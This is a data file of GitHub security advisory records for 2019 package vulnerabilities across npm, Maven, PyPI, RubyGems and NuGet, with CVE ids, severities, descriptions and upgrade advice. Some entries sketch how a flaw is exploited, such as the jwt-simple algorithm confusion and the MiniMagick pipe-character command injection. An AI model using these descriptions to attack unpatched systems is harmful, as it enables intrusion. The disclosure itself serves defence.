985,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-85cw-hj65-qqv9,CVE-2019-16335,https://github.com/advisories/GHSA-85cw-hj65-qqv9,critical,2019-09-23 18:33:45 UTC,Polymorphic Typing issue in FasterXML jackson-databind,A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariDataSource. This is a different vulnerability than CVE-2019-14540.,maven
986,16205,bower,GHSA-p6mr-pxg4-68hx,CVE-2019-5484,https://github.com/advisories/GHSA-p6mr-pxg4-68hx,high,2019-09-17 23:21:34 UTC,Symlink Arbitrary File Overwrite in bower,"Versions of `bower` prior to 1.8.8 are affected by an arbitrary file write vulnerability. The vulnerability occurs because `bower` does not verify that extracted symbolic links do not resolve to targets outside of the extraction root directory.



## Recommendation

Update to version 1.8.8 or later",npm
987,34841,org.eclipse.paho:org.eclipse.paho.client.mqttv3,GHSA-63qc-p2x4-9fgf,CVE-2019-11777,https://github.com/advisories/GHSA-63qc-p2x4-9fgf,moderate,2019-09-17 22:47:11 UTC,Improper Handling of Exceptional Conditions and Origin Validation Error in Eclipse Paho Java client library,"In the Eclipse Paho Java client library version 1.2.0, when connecting to an MQTT server using TLS and setting a host name verifier, the result of that verification is not checked. This could allow one MQTT server to impersonate another and provide the client library with incorrect information.",maven
988,13866,System.Management.Automation,GHSA-62gw-3rmj-wmp2,CVE-2019-1301,https://github.com/advisories/GHSA-62gw-3rmj-wmp2,high,2019-09-13 13:25:47 UTC,High severity vulnerability that affects System.Management.Automation,"## Microsoft Security Advisory CVE-2019-1301: Denial of Service Vulnerability in .NET Core

# Microsoft Security Advisory CVE-2019-1301: Denial of Service Vulnerability in PowerShell Core
## Executive Summary

A denial of service vulnerability exists when PowerShell Core or .NET Core improperly handles web requests. An attacker who successfully exploited this vulnerability could cause a denial of service against a PowerShell Core scripts.

The update addresses the vulnerability by correcting how the .NET Core handles web requests.

System administrators are advised to update PowerShell Core to an unaffected version (see [affected software](#user-content-affected-software).)


## Discussion

Please [open a support question](https://github.com/PowerShell/PowerShell/issues/new?assignees=&labels=Issue-Question&template=Support_Question.md&title=Support+Question) to discussion the PowerShell aspects of this advisory.
Please use dotnet/announcements#121 for discussion of the .NET aspects this advisory.

## <a name=""affected-software"">Affected Software</a>

The vulnerability affects PowerShell Core prior to the following versions:

| PowerShell Core Version | Fixed in          |
|-------------------------|-------------------|
| 6.1                     | 6.1.6               |
| 6.2                     | 6.2.3               |
| 7.0                     | unaffected               |

## Advisory FAQ

### How do I know if I am affected?

If all of the following are true:

1. Run `pwsh -v`, then, check the version in the table in [Affected Software](#user-content-affected-software) to see if your version of PowerShell Core is affected.
1. If you are running a version of PowerShell Core where the executable is not `pwsh` or `pwsh.exe`, then you are affected.  This only existed for preview version of `6.0`.

### How do I update to an unaffected version?

Follow the instructions at [Installing PowerShell Core](https://docs.microsoft.com/en-us/powershell/scripting/setup/installing-powershell?view=powershell-6) to install the latest version of PowerShell Core.

## Other Information

### Reporting Security Issues

If you have found a potential security issue in PowerShell Core,
please email details to secure@microsoft.com.

### Support

You can ask questions about this issue on GitHub in the PowerShell organization.
This is located at https://github.com/PowerShell/.
The Announcements repo (https://github.com/PowerShell/Announcements)
will contain this bulletin as an issue and will include a link to a discussion issue where you can ask questions.

### What if the update breaks my script or module?

You can uninstall the newer version of PowerShell Core and install the previous version of PowerShell Core.
This should be treated as a temporary measure.
Therefore, the script or module should be updated to work with the patched version of PowerShell Core.

### Acknowledgments

Paul Ryman of VMware Sydney Engineering Team

Microsoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure.

See [acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments) for more information.

### External Links

[CVE-2019-1301](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1301)

### Revisions

V1.0 (September 12, 2019): Advisory published.

*Version 1.0*
*Last Updated 2019-09-12*",nuget
989,17787,seneca,GHSA-2xwv-3cc9-fp7c,CVE-2019-5483,https://github.com/advisories/GHSA-2xwv-3cc9-fp7c,low,2019-09-11 23:07:57 UTC,Sensitive Data Exposure in seneca,"Versions of `seneca` prior to 3.9.0 are vulnerable to Sensitive Data Exposure. When a process using the package crashes all environment variables are printed. This may leak sensitive data such as access keys, especially given scenarios when log-monitoring systems store the error output.


## Recommendation

Upgrade to version 3.9.0 or later.",npm
990,18908,devise,GHSA-fcjw-8rhj-gwwc,CVE-2019-16109,https://github.com/advisories/GHSA-fcjw-8rhj-gwwc,high,2019-09-11 23:06:57 UTC,Authentication Bypass in Devise,"An issue was discovered in Plataformatec Devise before 4.7.1. It confirms accounts upon receiving a request with a blank confirmation_token, if a database record has a blank value in the confirmation_token column. (However, there is no scenario within Devise itself in which such database records would exist.)",rubygems
991,20491,httpie,GHSA-xjjg-vmw6-c2p9,CVE-2019-10751,https://github.com/advisories/GHSA-xjjg-vmw6-c2p9,high,2019-08-27 17:44:33 UTC,Open Redirect in httpie,"All versions of the HTTPie package prior to version 1.0.3 are vulnerable to Open Redirect that allows an attacker to write an arbitrary file with supplied filename and content to the current directory, by redirecting a request from HTTP to a crafted URL pointing to a server in his or hers control.",pip
992,34807,org.apache.santuario:xmlsec,GHSA-4q98-wr72-h35w,CVE-2019-12400,https://github.com/advisories/GHSA-4q98-wr72-h35w,moderate,2019-08-27 17:41:33 UTC,Improper input validation in Apache Santuario XML Security for Java,"In version 2.0.3 Apache Santuario XML Security for Java, a caching mechanism was introduced to speed up creating new XML documents using a static pool of DocumentBuilders. However, if some untrusted code can register a malicious implementation with the thread context class loader first, then this implementation might be cached and re-used by Apache Santuario - XML Security for Java, leading to potential security flaws when validating signed documents, etc. The vulnerability affects Apache Santuario - XML Security for Java 2.0.x releases from 2.0.3 and all 2.1.x releases before 2.1.4.",maven
993,30254,django-js-reverse,GHSA-vx6v-2rg6-865h,CVE-2019-15486,https://github.com/advisories/GHSA-vx6v-2rg6-865h,moderate,2019-08-27 17:39:33 UTC,Cross-site Scripting in django-js-reverse,django-js-reverse (aka Django JS Reverse) before 0.9.1 has XSS via js_reverse_inline.,pip
994,20023,nltk,GHSA-mr7p-25v2-35wr,CVE-2019-14751,https://github.com/advisories/GHSA-mr7p-25v2-35wr,high,2019-08-23 21:53:51 UTC,Path Traversal in nltk,"NLTK Downloader before 3.4.5 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ../ (dot dot slash) in an NLTK package (ZIP archive) that is mishandled during extraction.",pip
995,16330,sequelize,GHSA-2777-2vq8-c4v4,CVE-2019-11069,https://github.com/advisories/GHSA-2777-2vq8-c4v4,high,2019-04-11 16:33:17 UTC,SQL Injection in sequelize,"Versions of `sequelize` prior to 5.3.0 (excluding v3 and v4) are vulnerable to SQL Injection. PostgreSQL option`standard_conforming_strings` is not set to `on` by default, which may allow attackers to inject SQL statements due to poor handling of backslashes in string literals.


## Recommendation

Upgrade to version 5.3.0 or later.",npm
996,18836,rest-client,GHSA-333g-rpr4-7hxq,CVE-2019-15224,https://github.com/advisories/GHSA-333g-rpr4-7hxq,critical,2019-08-20 14:29:03 UTC,Backdoor / Malicious code,"The rest-client gem 1.6.10 through 1.6.13 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party.
Users of an affected version should consider downgrading to the last non-affected version of 1.6.9, or upgrading to 1.7.x.
Additionally, a set of other minor gems have been partially or completely yanked and are included in this advisory.
These include cron_parser, coin_base, blockchain_wallet, awesome-bot, doge-coin, capistrano-colors, bitcoin_vanity, lita_coin, coming-soon, and omniauth_amazon.",rubygems
997,18823,nokogiri,GHSA-cr5j-953j-xw5p,CVE-2019-5477,https://github.com/advisories/GHSA-cr5j-953j-xw5p,critical,2019-08-19 19:27:23 UTC,Arbitrary execution of code in Nokogiri,A command injection vulnerability in Nokogiri v1.10.3 and earlier allows commands to be executed in a subprocess via Ruby's `Kernel.open` method. Processes are vulnerable only if the undocumented method `Nokogiri::CSS::Tokenizer#load_file` is being called with unsafe user input as the filename. This vulnerability appears in code generated by the Rexical gem versions v1.0.6 and earlier. Rexical is used by Nokogiri to generate lexical scanner code for parsing CSS queries. The underlying vulnerability was addressed in Rexical v1.0.7 and Nokogiri upgraded to this version of Rexical in Nokogiri v1.10.4.,rubygems
998,34455,org.apache.tika:tika-core,GHSA-mfwh-gqx8-c787,CVE-2019-10088,https://github.com/advisories/GHSA-mfwh-gqx8-c787,high,2019-08-06 01:43:40 UTC,Allocation of Resources Without Limits or Throttling in Apache Tika,A carefully crafted or corrupt zip file can cause an OOM in Apache Tika's RecursiveParserWrapper in versions 1.7-1.21. Users should upgrade to 1.22 or later.,maven
999,34629,org.apache.tika:tika-parsers,GHSA-4mq5-mj59-qq9c,CVE-2019-10093,https://github.com/advisories/GHSA-4mq5-mj59-qq9c,moderate,2019-08-06 01:43:38 UTC,Allocation of Resources Without Limits or Throttling in Apache Tika,"In Apache Tika 1.19 to 1.21, a carefully crafted 2003ml or 2006ml file could consume all available SAXParsers in the pool and lead to very long hangs. Apache Tika users should upgrade to 1.22 or later.",maven
1000,34455,org.apache.tika:tika-core,GHSA-mm7m-xg4h-6m52,CVE-2019-10094,https://github.com/advisories/GHSA-mm7m-xg4h-6m52,high,2019-08-06 01:43:35 UTC,Allocation of Resources Without Limits or Throttling in Apache Tika,"A carefully crafted package/compressed file that, when unzipped/uncompressed yields the same file (a quine), causes a StackOverflowError in Apache Tika's RecursiveParserWrapper in versions 1.7-1.21. Apache Tika users should upgrade to 1.22 or later.",maven
1001,34577,org.apache.solr:solr-core,GHSA-3gm7-v7vw-866c,CVE-2019-0193,https://github.com/advisories/GHSA-3gm7-v7vw-866c,high,2019-08-01 19:17:35 UTC,XML External Entity (XXE) Injection in Apache Solr,"In Apache Solr, the DataImportHandler, an optional but popular module to pull in data from databases and other sources, has a feature in which the whole DIH configuration can come from a request's ""dataConfig"" parameter. The debug mode of the DIH admin screen uses this to allow convenient debugging / development of a DIH config. Since a DIH config can contain scripts, this parameter is a security risk. Starting with version 8.2.0 of Solr, use of this parameter requires setting the Java System property ""enable.dih.dataConfigParam"" to true.",maven
1002,35045,org.apache.activemq:activemq-client,GHSA-jvpp-hxjj-5ccc,CVE-2015-7559,https://github.com/advisories/GHSA-jvpp-hxjj-5ccc,moderate,2019-08-01 19:17:45 UTC,Improper Input Validation and Missing Authentication for Critical Function in Apache ActiveMQ,It was found that the Apache ActiveMQ client before 5.15.5 exposed a remote shutdown command in the ActiveMQConnection class. An attacker logged into a compromised broker could use this flaw to achieve denial of service on a connected client.,maven
1003,38006,org.apache.storm:storm-kafka,GHSA-25pc-85qf-6j69,CVE-2018-11779,https://github.com/advisories/GHSA-25pc-85qf-6j69,critical,2019-08-01 19:17:53 UTC,Deserialization of Untrusted Data in Apache Storm,"In Apache Storm versions 1.1.0 to 1.2.2, when the user is using the storm-kafka-client or storm-kafka modules, it is possible to cause the Storm UI daemon to deserialize user provided bytes into a Java class.",maven
1004,34497,io.undertow:undertow-core,GHSA-w69w-jvc7-wjgv,CVE-2019-10184,https://github.com/advisories/GHSA-w69w-jvc7-wjgv,high,2019-08-01 19:18:16 UTC,Missing Authorization in undertow,undertow before version 2.0.23.Final is vulnerable to an information leak issue. Web apps may have their directory structures predicted through requests without trailing slashes via the api.,maven
1005,16827,yarn,GHSA-wqfc-cr59-h64p,CVE-2019-5448,https://github.com/advisories/GHSA-wqfc-cr59-h64p,high,2019-07-31 04:22:15 UTC,Missing Encryption of Sensitive Data in yarn,Yarn before 1.17.3 is vulnerable to Missing Encryption of Sensitive Data due to HTTP URLs in lockfile causing unencrypted authentication data to be sent over the network.,npm
1006,20092,ansible,GHSA-grgm-pph5-j5h7,CVE-2019-10156,https://github.com/advisories/GHSA-grgm-pph5-j5h7,moderate,2019-07-31 04:22:49 UTC,Exposure of Sensitive Information to an Unauthorized Actor in ansible,"A flaw was discovered in the way Ansible templating was implemented in versions before 2.6.18, 2.7.12 and 2.8.2, causing the possibility of information disclosure through unexpected variable substitution. By taking advantage of unintended variable substitution the content of any variable may be disclosed.",pip
1007,28778,python-engineio,GHSA-j3jp-gvr5-7hwq,CVE-2019-13611,https://github.com/advisories/GHSA-j3jp-gvr5-7hwq,high,2019-07-30 20:47:25 UTC,python-engineio vulnerable to Cross-Site Request Forgery (CSRF),"## WebSocket cross-origin vulnerability

### Impact
This is a Cross-Site Request Forgery (CSRF) vulnerability. It affects Socket.IO and Engine.IO web servers that authenticate clients using cookies.

### Patches
python-engineio version 3.9.0 patches this vulnerability by adding server-side Origin header checks.

### Workarounds
Do not use cookies for client authentication, or else add a CSRF token to the connection URL.

### References
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-engineio](http://github.com/miguelgrinberg/python-engineio)",pip
1008,20279,scapy,GHSA-mpf2-q34c-fc6j,CVE-2019-1010142,https://github.com/advisories/GHSA-mpf2-q34c-fc6j,high,2019-07-22 14:53:58 UTC,Infinite Loop in scapy,"scapy 2.4.0 is affected by Denial of Service. The impact is infinite loop, resource consumption and program unresponsive. The component is _RADIUSAttrPacketListField.getfield(self..). The attack vector is over the network or in a pcap. both work.",pip
1009,18808,lodash,GHSA-x5rq-j2xg-h7qm,CVE-2019-1010266,https://github.com/advisories/GHSA-x5rq-j2xg-h7qm,moderate,2019-07-19 16:13:07 UTC,Regular Expression Denial of Service (ReDoS) in lodash,"lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.",npm
1010,18955,mini_magick,GHSA-r7j3-vvh2-xrpj,CVE-2019-13574,https://github.com/advisories/GHSA-r7j3-vvh2-xrpj,high,2019-07-18 13:19:22 UTC,OS Command Injection in MiniMagick,"In lib/mini_magick/image.rb in MiniMagick before 4.9.4, a fetched remote image filename could cause remote command execution because Image.open input is directly passed to Kernel#open, which accepts a '|' character followed by a command.",rubygems
1011,13866,System.Management.Automation,GHSA-5frh-8cmj-gc59,CVE-2019-1167,https://github.com/advisories/GHSA-5frh-8cmj-gc59,moderate,2019-07-17 19:14:18 UTC,System.Management.Automation subject to bypass via script debugging,"## Microsoft Security Advisory CVE-2019-1167: Windows Defender Application Control Security Feature Bypass Vulnerability

# Microsoft Security Advisory CVE-2019-1167: Windows Defender Application Control Security Feature Bypass Vulnerability

## Executive Summary

A security feature bypass vulnerability exists in Windows Defender Application Control (WDAC) which could allow an attacker to bypass WDAC enforcement.
An attacker who successfully exploited this vulnerability could circumvent PowerShell Core Constrained Language Mode on the machine.

 To exploit the vulnerability,
an attacker would first have access to the local machine where PowerShell is running in Constrained Language mode.
By doing that an attacker could leverage script debugging to abuse signed modules in an unintended way.

The update addresses the vulnerability by correcting how PowerShell functions in Constrained Language Mode.
System administrators are advised to update PowerShell Core to an unaffected version (see [affected software](#user-content-affected-software).)

## Discussion

Please use PowerShell/PowerShell#TBD for discussion of this advisory.

## <a name=""affected-software"">Affected Software</a>

The vulnerability affects PowerShell Core prior to the following versions:

| PowerShell Core Version | Fixed in          |
|-------------------------|-------------------|
| 6.1                     | 6.1.5               |
| 6.2                     | 6.2.2               |

## Advisory FAQ

### How do I know if I am affected?

If all of the following are true:

1. Run `pwsh -v`, then, check the version in the table in [Affected Software](#user-content-affected-software) to see if your version of PowerShell Core is affected.
1. If you are running a version of PowerShell Core where the executable is not `pwsh` or `pwsh.exe`, then you are affected.  This only existed for preview version of `6.0`.

### How do I update to an unaffected version?

Follow the instructions at [Installing PowerShell Core](https://docs.microsoft.com/en-us/powershell/scripting/setup/installing-powershell?view=powershell-6) to install the latest version of PowerShell Core.

## Other Information

### Reporting Security Issues

If you have found a potential security issue in PowerShell Core,
please email details to secure@microsoft.com.

### Support

You can ask questions about this issue on GitHub in the PowerShell organization.
This is located at https://github.com/PowerShell/.
The Announcements repo (https://github.com/PowerShell/Announcements)
will contain this bulletin as an issue and will include a link to a discussion issue where you can ask questions.

### What if the update breaks my script or module?

You can uninstall the newer version of PowerShell Core and install the previous version of PowerShell Core.
This should be treated as a temporary measure.
Therefore, the script or module should be updated to work with the patched version of PowerShell Core.

### Acknowledgments

Microsoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure.

See [acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments) for more information.

### External Links

[CVE-2019-1167](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1167)

### Revisions

V1.0 (July 16, 2019): Advisory published.

*Version 1.0*
*Last Updated 2019-07-16*",nuget
1012,16013,handlebars,GHSA-q42p-pg8m-cqh6,,https://github.com/advisories/GHSA-q42p-pg8m-cqh6,high,2019-06-05 14:07:48 UTC,Prototype Pollution in handlebars,"Versions of `handlebars` prior to 4.0.14 are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.


## Recommendation

For handlebars 4.1.x upgrade to 4.1.2 or later.
For handlebars 4.0.x upgrade to 4.0.14 or later.",npm
1013,34638,org.apache.pdfbox:pdfbox,GHSA-c9jj-3wvg-q65h,CVE-2019-0228,https://github.com/advisories/GHSA-c9jj-3wvg-q65h,critical,2019-07-05 21:12:54 UTC,Vulnerability that affects org.apache.pdfbox:pdfbox,"Apache PDFBox 2.0.14 does not properly initialize the XML parser, which allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted XFDF.",maven
1014,27901,ruby-saml,GHSA-x2fr-v8wf-8wwv,CVE-2017-11428,https://github.com/advisories/GHSA-x2fr-v8wf-8wwv,high,2019-07-05 21:11:35 UTC,High severity vulnerability that affects ruby-saml,"OneLogin Ruby-SAML 1.6.0 and earlier may incorrectly utilize the results of XML DOM traversal and canonicalization APIs in such a way that an attacker may be able to manipulate the SAML data without invalidating the cryptographic signature, allowing the attack to potentially bypass authentication to SAML service providers.",rubygems
1015,15223,DotNetNuke.Core,GHSA-h595-8pw6-5q6v,CVE-2018-15811,https://github.com/advisories/GHSA-h595-8pw6-5q6v,high,2019-07-05 21:08:36 UTC,Inadequate Encryption Strength in DotNetNuke,DNN (aka DotNetNuke) 9.2 through 9.2.1 uses a weak encryption algorithm to protect input parameters.,nuget
1016,15223,DotNetNuke.Core,GHSA-pf46-gqg9-j3v3,CVE-2018-15812,https://github.com/advisories/GHSA-pf46-gqg9-j3v3,high,2019-07-05 21:08:24 UTC,Insufficient Entropy in DotNetNuke,"DNN (aka DotNetNuke) 9.2 through 9.2.1 incorrectly converts encryption key source values, resulting in lower than expected entropy.",nuget
1017,15223,DotNetNuke.Core,GHSA-xx3h-j3cx-8qfj,CVE-2018-18326,https://github.com/advisories/GHSA-xx3h-j3cx-8qfj,high,2019-07-05 21:08:20 UTC,Insufficient Entropy in DotNetNuke,"DNN (aka DotNetNuke) 9.2 through 9.2.2 incorrectly converts encryption key source values, resulting in lower than expected entropy. NOTE: this issue exists because of an incomplete fix for CVE-2018-15812.",nuget
1018,15223,DotNetNuke.Core,GHSA-j3g9-6fx5-gjv7,CVE-2018-18325,https://github.com/advisories/GHSA-j3g9-6fx5-gjv7,high,2019-07-05 21:08:16 UTC,Inadequate Encryption Strength in DotNetNuke,DNN (aka DotNetNuke) 9.2 through 9.2.2 uses a weak encryption algorithm to protect input parameters. NOTE: this issue exists because of an incomplete fix for CVE-2018-15811.,nuget
1019,37176,io.hawt:hawtio-core,GHSA-mcg9-64cp-xwp7,CVE-2019-9827,https://github.com/advisories/GHSA-mcg9-64cp-xwp7,critical,2019-07-05 21:08:09 UTC,Server-Side Request Forgery in Hawt Hawtio,"Hawt Hawtio through 2.5.0 is vulnerable to SSRF, allowing a remote attacker to trigger an HTTP request from an affected server to an arbitrary host via the initial /proxy/ substring of a URI.",maven
1020,18825,yard,GHSA-xfhh-rx56-rxcr,CVE-2019-1020001,https://github.com/advisories/GHSA-xfhh-rx56-rxcr,high,2019-07-02 15:28:38 UTC,Path Traversal vulnerability that affects yard,"## Possible arbitrary path traversal and file access via `yard server`

### Impact

A path traversal vulnerability was discovered in YARD <= 0.9.19 when using `yard server` to serve documentation. This bug would allow unsanitized HTTP requests to access arbitrary files on the machine of a yard server host under certain conditions.

Thanks to CuongMX from Viettel Cyber Security for discovering this vulnerability.

### Patches

Please upgrade to YARD v0.9.20 immediately if you are relying on yard server to host documentation in any untrusted environments.

### Workarounds

For users who cannot upgrade, it is possible to perform path sanitization of HTTP requests at your webserver level. WEBrick, for example, can perform such sanitization by default (which you can use via `yard server -s webrick`), as can certain rules in your webserver configuration.",rubygems
1021,16174,angular,GHSA-28hp-fgcr-2r4h,,https://github.com/advisories/GHSA-28hp-fgcr-2r4h,moderate,2019-06-27 17:25:42 UTC,Cross-Site Scripting via JSONP,"JSONP allows untrusted resource URLs, which provides a vector for attack by malicious actors.",npm
1022,35825,org.keycloak:keycloak-core,GHSA-38cg-gg9j-q9j9,CVE-2019-3875,https://github.com/advisories/GHSA-38cg-gg9j-q9j9,moderate,2019-06-27 17:25:57 UTC,Improper Certificate Validation and Insufficient Verification of Data Authenticity in Keycloak,"A vulnerability was found in keycloak before 6.0.2. The X.509 authenticator supports the verification of client certificates through the CRL, where the CRL list can be obtained from the URL provided in the certificate itself (CDP) or through the separately configured path. The CRL are often available over the network through unsecured protocols ('http' or 'ldap') and hence the caller should verify the signature and possibly the certification path. Keycloak currently doesn't validate signatures on CRL, which can result in a possibility of various attacks like man-in-the-middle.",maven
1023,27899,rubygems-update,GHSA-4wm8-fjv7-j774,CVE-2019-8325,https://github.com/advisories/GHSA-4wm8-fjv7-j774,high,2019-06-20 16:08:21 UTC,Escape sequence injection in RubyGems,"An issue was discovered in RubyGems 2.6 and later through 3.0.2. Since Gem::CommandManager#run calls alert_error without escaping, escape sequence injection is possible. (There are many ways to cause an error.)",rubygems
1024,27899,rubygems-update,GHSA-5x32-c9mf-49cc,CVE-2019-8320,https://github.com/advisories/GHSA-5x32-c9mf-49cc,high,2019-06-20 16:06:15 UTC,Directory traversal in RubyGems,"A Directory Traversal issue was discovered in RubyGems 2.7.6 and later through 3.0.2. Before making new directories or touching files (which now include path-checking code for symlinks), it would delete the target destination. If that destination was hidden behind a symlink, a malicious gem could delete arbitrary files on the user's machine, presuming the attacker could guess at paths. Given how frequently gem is run as sudo, and how predictable paths are on modern systems (/tmp, /usr, etc.), this could likely lead to data loss or an unusable system.",rubygems
1025,27899,rubygems-update,GHSA-76wm-422q-92mq,CVE-2019-8324,https://github.com/advisories/GHSA-76wm-422q-92mq,high,2019-06-20 16:06:11 UTC,Code injection in RubyGems,"An issue was discovered in RubyGems 2.6 and later through 3.0.2. A crafted gem with a multi-line name is not handled correctly. Therefore, an attacker could inject arbitrary code to the stub line of gemspec, which is eval-ed by code in ensure_loadable_spec during the preinstall check.",rubygems
1026,27899,rubygems-update,GHSA-fr32-gr5c-xq5c,CVE-2019-8321,https://github.com/advisories/GHSA-fr32-gr5c-xq5c,high,2019-06-20 16:06:04 UTC,Escape sequence injection in RubyGems,"An issue was discovered in RubyGems 2.6 and later through 3.0.2. Since Gem::UserInteraction#verbose calls say without escaping, escape sequence injection is possible.",rubygems
1027,27899,rubygems-update,GHSA-mh37-8c3g-3fgc,CVE-2019-8322,https://github.com/advisories/GHSA-mh37-8c3g-3fgc,high,2019-06-20 16:06:00 UTC,Escape sequence injection in RubyGems,"An issue was discovered in RubyGems 2.6 and later through 3.0.2. The gem owner command outputs the contents of the API response directly to stdout. Therefore, if the response is crafted, escape sequence injection may occur.",rubygems
1028,27899,rubygems-update,GHSA-3h4r-pjv6-cph9,CVE-2019-8323,https://github.com/advisories/GHSA-3h4r-pjv6-cph9,high,2019-06-20 16:05:57 UTC,Escape sequence injection in RubyGems,"An issue was discovered in RubyGems 2.6 and later through 3.0.2. Gem::GemcutterUtilities#with_response may output the API response to stdout as it is. Therefore, if the API side modifies the response, escape sequence injection may occur.",rubygems
1029,16245,open,GHSA-28xh-wpgr-7fm8,,https://github.com/advisories/GHSA-28xh-wpgr-7fm8,critical,2019-06-20 15:35:49 UTC,Command Injection in open,"Versions of `open` before 6.0.0 are vulnerable to command injection when unsanitized user input is passed in.

The package does come with the following warning in the readme:

```
The same care should be taken when calling open as if you were calling child_process.exec directly. If it is an executable it will run in a new shell.
```


## Recommendation

`open` is now the deprecated `opn` package. Upgrading to the latest version is likely have unwanted effects since it now has a very different API but will prevent this vulnerability.",npm
1030,16371,esm,GHSA-qx4v-6gc5-f2vv,,https://github.com/advisories/GHSA-qx4v-6gc5-f2vv,moderate,2019-06-20 14:32:56 UTC,Regular Expression Denial of Service,"A Regular Expression Denial of Service vulnerability was discovered in esm before 3.1.0. The issue is that esm's find-indexes is using the unescaped identifiers in a regex, which, in this case, causes an infinite loop.",npm
1031,16268,underscore.string,GHSA-v2p6-4mp7-3r9v,,https://github.com/advisories/GHSA-v2p6-4mp7-3r9v,moderate,2019-06-14 16:26:22 UTC,Regular Expression Denial of Service in underscore.string,"Versions of `underscore.string` prior to *3.3.5* are vulnerable to Regular Expression Denial of Service (ReDoS).

The function `unescapeHTML` is vulnerable to ReDoS due to an overly-broad regex. The slowdown is approximately 2s for 50,000 characters but grows exponentially with larger inputs.


## Recommendation

Upgrade to version 3.3.5 or higher.",npm
1032,34497,io.undertow:undertow-core,GHSA-jwgx-9mmh-684w,CVE-2019-3888,https://github.com/advisories/GHSA-jwgx-9mmh-684w,critical,2019-06-13 20:02:56 UTC,Credential exposure through log files in Undertow,"A vulnerability was found in Undertow web server before 2.0.21. An information exposure of plain text credentials through log files because Connectors.executeRootHandler:402 logs the HttpServerExchange object at ERROR level using UndertowLogger.REQUEST_LOGGER.undertowRequestFailed(t, exchange)",maven
1033,16509,diff,GHSA-h6ch-v84p-w6p9,,https://github.com/advisories/GHSA-h6ch-v84p-w6p9,high,2019-06-13 18:58:54 UTC,Regular Expression Denial of Service (ReDoS),"A vulnerability was found in diff before v3.5.0, the affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.",npm
1034,19359,ruby-openid,GHSA-fqfj-cmh6-hj49,CVE-2019-11027,https://github.com/advisories/GHSA-fqfj-cmh6-hj49,critical,2019-06-13 16:15:56 UTC,Ruby OpenID,"Ruby OpenID (aka ruby-openid) through 2.8.0 has a remotely exploitable flaw. This library is used by Rails web applications to integrate with OpenID Providers. Severity can range from medium to critical, depending on how a web application developer chose to employ the ruby-openid library. Developers who based their OpenID integration heavily on the ""example app"" provided by the project are at highest risk.",rubygems
1035,20216,parso,GHSA-22mf-97vh-x8rw,CVE-2019-12760,https://github.com/advisories/GHSA-22mf-97vh-x8rw,high,2019-06-13 16:12:57 UTC,TODO,"** DISPUTED ** A deserialization vulnerability exists in the way parso through 0.4.0 handles grammar parsing from the cache. Cache loading relies on pickle and, provided that an evil pickle can be written to a cache grammar file and that its parsing can be triggered, this flaw leads to Arbitrary Code Execution.  NOTE: This is disputed because ""the cache directory is not under control of the attacker in any common configuration.""",pip
1036,36389,ca.uhn.hapi.fhir:hapi-fhir-base,GHSA-52mh-p2m2-w625,CVE-2019-12741,https://github.com/advisories/GHSA-52mh-p2m2-w625,moderate,2019-06-07 20:56:59 UTC,Cross-site Scripting in HAPI FHIR,"XSS exists in the HAPI FHIR testpage overlay module of the HAPI FHIR library before 3.8.0. The attack involves unsanitized HTTP parameters being output in a form page, allowing attackers to leak cookies and other sensitive information from ca/uhn/fhir/to/BaseController.java via a specially crafted URL. (This module is not generally used in production systems so the attack surface is expected to be low, but affected systems are recommended to upgrade immediately.)",maven
1037,19780,chartkick,GHSA-g45g-g52h-39rg,CVE-2019-12732,https://github.com/advisories/GHSA-g45g-g52h-39rg,moderate,2019-06-07 20:56:42 UTC,Cross-site Scripting in Chartkick,The Chartkick gem through 3.1.0 for Ruby allows XSS.,rubygems
1038,20419,pyxdg,GHSA-r6v3-hpxj-r8rv,CVE-2019-12761,https://github.com/advisories/GHSA-r6v3-hpxj-r8rv,high,2019-06-07 20:56:27 UTC,Code Injection in PyXDG,A code injection issue was discovered in PyXDG before 0.26 via crafted Python code in a Category element of a Menu XML document in a .menu file. XDG_CONFIG_DIRS must be set up to trigger xdg.Menu.parse parsing within the directory containing this file. This is due to a lack of sanitization in xdg/Menu.py before an eval call.,pip
1039,17984,remarkable,GHSA-q22g-8fr4-qpj4,CVE-2019-12041,https://github.com/advisories/GHSA-q22g-8fr4-qpj4,high,2019-06-06 15:32:15 UTC,Regular Expression Denial of Service in remarkable,lib/common/html_re.js in remarkable 1.7.1 allows Regular Expression Denial of Service (ReDoS) via a CDATA section.,npm
1040,17908,jwt-simple,GHSA-8v5f-hp78-jgxq,,https://github.com/advisories/GHSA-8v5f-hp78-jgxq,high,2019-06-06 15:30:33 UTC,Signature Verification Bypass in jwt-simple,"Versions of `jwt-simple` prior to 0.5.3 are vulnerable to Signature Verification Bypass. If no algorithm is specified in the `decode()` function, the packages uses the algorithm in the JWT to decode tokens. This allows an attacker to create a HS256 (symmetric algorithm) JWT with the server's public key as secret, and the package will verify it as HS256 instead of RS256 (asymmetric algorithm).


## Recommendation

Upgrade to version 0.5.3 or later.",npm
1041,17171,typeorm,GHSA-w7q7-vjp8-7jv4,,https://github.com/advisories/GHSA-w7q7-vjp8-7jv4,high,2019-06-06 15:30:16 UTC,SQL Injection in typeorm,"Versions of `typeorm` before 0.1.15 are vulnerable to SQL Injection. Field names are not properly validated allowing attackers to inject SQL statements and execute arbitrary SQL queries.


## Recommendation

Upgrade to version 0.1.15",npm
